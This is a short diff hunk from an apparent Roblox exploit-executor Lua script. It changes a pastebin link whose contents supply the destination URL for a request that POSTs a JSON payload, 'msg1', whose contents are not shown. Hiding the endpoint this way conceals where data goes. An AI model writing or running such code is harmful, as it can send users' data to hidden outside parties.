@@ -80,7 +80,7 @@ else
                 }
                 syn.request(
                     {
-                    Url = game:HttpGet("https://pastebin.com/raw/YsJLzLaj"),
+                    Url = game:HttpGet("https://pastebin.com/raw/eztndh2k"),
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = game:GetService("HttpService"):JSONEncode(msg1)
